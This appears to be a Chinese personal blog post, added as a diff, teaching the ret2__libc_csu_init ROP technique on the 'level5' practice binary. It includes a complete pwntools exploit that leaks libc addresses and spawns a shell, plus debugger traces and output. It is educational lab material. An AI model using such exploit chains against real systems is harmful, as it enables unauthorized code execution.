@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<meta name="google-site-verification" content="p4IkzO1jTITYkH5zlZW5A3-JHuC0DVJvFSM-3cYRn-k" />
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn学习," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="今天又是继续学习的一天  ，今天学习了中级rop的ret2__libc_csu_init原理在x64环境下函数的前6个参数是通过寄存器传参    而我们很多时候无法找到我们需要的每一个gadgets  so , 今天这种利用方式出现了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn学习之ret2__libc_csu_init">
+<meta property="og:url" content="https://huangpiao.tech/2020/01/31/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8Bret2-libc-csu-init/index.html">
+<meta property="og:site_name" content="x1a0g&#39;Blog">
+<meta property="og:description" content="今天又是继续学习的一天  ，今天学习了中级rop的ret2__libc_csu_init原理在x64环境下函数的前6个参数是通过寄存器传参    而我们很多时候无法找到我们需要的每一个gadgets  so , 今天这种利用方式出现了">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-01-31T05:03:07.000Z">
+<meta property="article:modified_time" content="2020-01-31T06:20:51.053Z">
+<meta property="article:author" content="x1a0g">
+<meta property="article:tag" content="pwn学习">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://huangpiao.tech/2020/01/31/pwn学习之ret2-libc-csu-init/"/>
+
+
+
+
+
+  <title>pwn学习之ret2__libc_csu_init | x1a0g'Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">x1a0g'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://huangpiao.tech/2020/01/31/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8Bret2-libc-csu-init/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="x1a0g">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="x1a0g'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pwn学习之ret2__libc_csu_init</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-31T13:03:07+08:00">
+                2020-01-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="今天又是继续学习的一天-，今天学习了中级rop的ret2-libc-csu-init"><a href="#今天又是继续学习的一天-，今天学习了中级rop的ret2-libc-csu-init" class="headerlink" title="今天又是继续学习的一天  ，今天学习了中级rop的ret2__libc_csu_init"></a>今天又是继续学习的一天  ，今天学习了中级rop的ret2__libc_csu_init</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在x64环境下函数的前6个参数是通过寄存器传参    而我们很多时候无法找到我们需要的每一个gadgets  so , 今天这种利用方式出现了  </p>
+<a id="more"></a>
+
+<ol>
+<li><p>首先我们要知道什么是  __libc_csu_init？</p>
+<ol>
+<li>这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在  但是要注意版本不通可能会有一定的区别</li>
+</ol>
+</li>
+<li><p>我们要如何去利用</p>
+<p>我们其实要利用的是这个函数当中的一些gadgets  ok  我们来看下我们常用的几个片段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x0000000000400622     pop rdi | ret  由于622指令错位出现的这个gadget</span><br></pre></td></tr></table></figure>
+
+<p>这个就是常常会利用到的三个  片段  第一个   40061A   这个我们可以 用来控制  400600这个片段的参数和要 call的函数   当我们把   rbx=0  rbp=1  r12=我们的函数地址   r13  r14  r15分别是我们的三个参数    这样就可以实现我们想要的功能</p>
+<p>而400622  通常用来给system函数来使用</p>
+</li>
+</ol>
+<h5 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h5><h6 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h6><p>​    这个例子是蒸米大神那几篇文章所使用的例子   level5  可以GitHub去下载一下   </p>
+<p>​    编译：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc level5.c -fno-stack-protector -no-pie -o level5</span><br></pre></td></tr></table></figure>
+
+<h6 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h6><p>​    扔到checksec 去分析一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec level5                                 </span><br><span class="line">[*] <span class="string">'/home/nmtech/Desktop/pwnstudy/ret2libc/ret2__libc_csu_init/level5'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 开的NX 保护    </p>
+<p>接下来我们就可以去计算我们的offset   是  128+8  </p>
+<p>因为我们有源码   且程序也比较简单  我们可以看到问题是出在vulnerable_function的read函数上</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">	<span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">write</span>(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">	vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>完事 题目没给system   没给 bin/sh    没给so文件   所以我们必须用使用ret2libc的手法来做   </p>
+<h6 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h6><ul>
+<li>首先必须leak出write函数的真实地址  由于write函数在溢出点之前只用过  所以用他 </li>
+<li>然后要去拿这个函数的函数地址 通过libcsearcher 来找到对应的libc版本  </li>
+<li>然后我们可以计算出libc的基址   之后通过基址计算出system和bin/sh的地址  </li>
+<li>最后构造第二次溢出去getshell   </li>
+</ul>
+<h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line">offset = <span class="number">0x80</span>+<span class="number">8</span>  <span class="comment">#偏移</span></span><br><span class="line">gadget_pop = <span class="number">0x040061A</span>   <span class="comment">#这是那pop一大堆参数那个gadgets</span></span><br><span class="line">gadget_call = <span class="number">0x0400600</span> <span class="comment"># 这是我们去call函数的那个gadgets</span></span><br><span class="line">gadget_rdi = <span class="number">0x0400623</span>   <span class="comment">#这是pop rdi | ret那个gadgets</span></span><br><span class="line">io = process(<span class="string">'./level5'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level5'</span>)</span><br><span class="line">raw_input()<span class="comment">#方便调试</span></span><br><span class="line">write_got_addr = elf.got[<span class="string">'write'</span>]</span><br><span class="line">vulfunc_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"===========leak write=========="</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*offset+p64(gadget_pop)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_got_addr)+p64(<span class="number">8</span>)+p64(write_got_addr)+p64(<span class="number">1</span>) <span class="comment">#使用gadgets构造第一次溢出  这里 rbp设置为1 是因为后头有个cmp语句会和rbp去比较如果rbp不等于1  就jmp了  所以为了不必要的麻烦设置成1就好</span></span><br><span class="line">payload1+=p64(gadget_call)+<span class="string">'\x90'</span>*<span class="number">56</span>+p64(vulfunc_addr)  <span class="comment"># 这边的这个56是因为当我们执行完call之后后头还有7条语句才会到达ret的位置 且因为是64位  所以 7*8=56  我在后头有调试时候的内容 </span></span><br><span class="line">io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">write_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span>  <span class="string">"write=======&gt;"</span>+str(hex(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">常规的操作 就是计算地址就不多解释了</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"===========calc system=========="</span></span><br><span class="line">obj = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line">libc_base = write_addr-obj.dump(<span class="string">'write'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base====&gt;'</span>+str(hex(libc_base))</span><br><span class="line">sys_addr = libc_base+obj.dump(<span class="string">'system'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'sys_addr=====&gt;'</span>+str(hex(sys_addr))</span><br><span class="line">bin_addr = libc_base+obj.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'bin_addr=====&gt;'</span>+str(hex(bin_addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"===========getshell=========="</span></span><br><span class="line">payload = <span class="string">'a'</span>*offset+p64(gadget_rdi)+p64(bin_addr)+p64(sys_addr)+p64(vulfunc_addr)<span class="comment">#最后通过gadgets来摆一下参数就可以了</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h6 id="56这个数的来历"><a href="#56这个数的来历" class="headerlink" title="56这个数的来历"></a>56这个数的来历</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x109 </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7f69a5856260 (&lt;__read_nocancel+7&gt;:	cmp    rax,0xfffffffffffff001)</span><br><span class="line">RDX: 0x200 </span><br><span class="line">RSI: 0x7ffde2d56b10 (<span class="string">'a'</span> &lt;repeats 136 <span class="built_in">times</span>&gt;, <span class="string">"\032\006@"</span>)</span><br><span class="line">RDI: 0x0 </span><br><span class="line">RBP: 0x1 </span><br><span class="line">RSP: 0x7ffde2d56bd0 --&gt; 0x400600 (&lt;__libc_csu_init+64&gt;:	mov    rdx,r13)</span><br><span class="line">RIP: 0x400624 (&lt;__libc_csu_init+100&gt;:	ret)</span><br><span class="line">R8 : 0x400630 (&lt;__libc_csu_fini&gt;:	repz ret)</span><br><span class="line">R9 : 0x7f69a5b39ac0 (&lt;_dl_fini&gt;:	push   rbp)</span><br><span class="line">R10: 0x37b </span><br><span class="line">R11: 0x246 </span><br><span class="line">R12: 0x601018 --&gt; 0x7f69a58562b0 (&lt;write&gt;:	)</span><br><span class="line">R13: 0x8 </span><br><span class="line">R14: 0x601018 --&gt; 0x7f69a58562b0 (&lt;write&gt;:	)</span><br><span class="line">R15: 0x1</span><br><span class="line">EFLAGS: 0x203 (CARRY parity adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:	pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:	pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:	pop    r15</span><br><span class="line">=&gt; 0x400624 &lt;__libc_csu_init+100&gt;:	ret    </span><br><span class="line">   0x400625:	nop</span><br><span class="line">   0x400626:	nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x400630 &lt;__libc_csu_fini&gt;:	repz ret </span><br><span class="line">   0x400632:	add    BYTE PTR [rax],al</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7ffde2d56bd0 --&gt; 0x400600 (&lt;__libc_csu_init+64&gt;:	mov    rdx,r13)</span><br><span class="line">0008| 0x7ffde2d56bd8 --&gt; 0x9090909090909090 </span><br><span class="line">0016| 0x7ffde2d56be0 --&gt; 0x9090909090909090 </span><br><span class="line">0024| 0x7ffde2d56be8 --&gt; 0x9090909090909090 </span><br><span class="line">0032| 0x7ffde2d56bf0 --&gt; 0x9090909090909090 </span><br><span class="line">0040| 0x7ffde2d56bf8 --&gt; 0x9090909090909090 </span><br><span class="line">0048| 0x7ffde2d56c00 --&gt; 0x9090909090909090 </span><br><span class="line">0056| 0x7ffde2d56c08 --&gt; 0x9090909090909090 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x0000000000400624 <span class="keyword">in</span> __libc_csu_init ()</span><br></pre></td></tr></table></figure>
+
+<p>这是完成第一个gadget将要ret的时候 可以看到我们参数都被布置好了</p>
+<p>下面这个就是56这个数的来历 和 前面rbp为何要置为1的原因：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/12i 0x400609</span><br><span class="line">=&gt; 0x400609 &lt;__libc_csu_init+73&gt;:	call   QWORD PTR [r12+rbx*8]</span><br><span class="line">   0x40060d &lt;__libc_csu_init+77&gt;:	add    rbx,0x1	//rbx初值为0是上面我们赋的  然后+1  = 1 所以我们要rbp也为1 </span><br><span class="line">   0x400611 &lt;__libc_csu_init+81&gt;:	cmp    rbx,rbp   //和rbp比较</span><br><span class="line">   0x400614 &lt;__libc_csu_init+84&gt;:	jne    0x400600 &lt;__libc_csu_init+64&gt;</span><br><span class="line">   0x400616 &lt;__libc_csu_init+86&gt;:	add    rsp,0x8 //从这边开始就是我们需要填充的地方</span><br><span class="line">   0x40061a &lt;__libc_csu_init+90&gt;:	pop    rbx   </span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:	pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:	pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:	pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:	pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:	pop    r15//到填充完这正好7*8</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:	ret</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="getshell-成功"><a href="#getshell-成功" class="headerlink" title="getshell 成功"></a>getshell 成功</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ python slove.py     </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./level5'</span>: pid 41090</span><br><span class="line">[*] <span class="string">'/home/nmtech/Desktop/pwnstudy/ret2libc/ret2__libc_csu_init/level5'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">===========leak write==========</span><br><span class="line"></span><br><span class="line">write=======&gt;0x7f27c48d42b0</span><br><span class="line">===========calc system==========</span><br><span class="line">[+] ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64) be choosed.</span><br><span class="line">libc_base====&gt;0x7f27c47dd000</span><br><span class="line">sys_addr=====&gt;0x7f27c4822390</span><br><span class="line">bin_addr=====&gt;0x7f27c4969d57</span><br><span class="line">===========getshell==========</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">level5    level5.c  Makefile  peda-session-level5.txt  slove.py</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+
+<h6 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h6><p><a href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP" target="_blank" rel="noopener">蒸米一步一步学rop</a></p>
+<p><a href="https://wiki.x10sec.org/pwn/stackoverflow/medium_rop/#_6" target="_blank" rel="noopener">ctf-wiki-中级rop</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn%E5%AD%A6%E4%B9%A0/" rel="tag"># pwn学习</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/30/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8Bret2libc%E7%BB%83%E4%B9%A0-%E6%B9%BE%E6%B9%BE%E6%9F%90%E5%AD%A6%E6%A0%A1/" rel="next" title="pwn学习之ret2libc练习(湾湾某学校)">
+                <i class="fa fa-chevron-left"></i> pwn学习之ret2libc练习(湾湾某学校)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/01/31/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8Bcanary%E7%BB%95%E8%BF%87%E5%88%9D%E6%8E%A2/" rel="prev" title="pwn学习之canary绕过初探(上篇)">
+                pwn学习之canary绕过初探(上篇) <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">x1a0g</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/x1a0g" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:wx975lm@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
